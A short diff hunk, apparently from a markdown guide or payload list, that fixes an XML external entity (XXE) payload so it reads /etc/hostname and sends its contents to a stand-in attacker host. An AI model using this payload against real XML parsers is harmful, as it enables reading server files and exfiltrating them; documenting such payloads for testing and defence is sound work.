@@ -63,7 +63,7 @@
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
-%eval;
+%stack;
 %exfil;
 ```
 
